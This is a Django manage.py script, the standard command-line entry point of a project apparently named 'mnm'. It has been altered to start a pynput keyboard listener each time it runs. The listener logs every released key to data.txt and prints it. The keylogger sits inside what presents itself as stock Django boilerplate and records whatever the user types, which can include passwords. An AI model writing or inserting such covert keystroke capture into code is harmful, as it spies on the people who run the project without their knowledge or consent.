#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys
from pynput import keyboard
def on_release(key):
    print('{0}'.format(key))
    f = open('data.txt', 'a')
    f.write(str(key))
    f.close()

    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(
            on_release=on_release)
    listener.start()

    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mnm.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == '__main__':
    main()
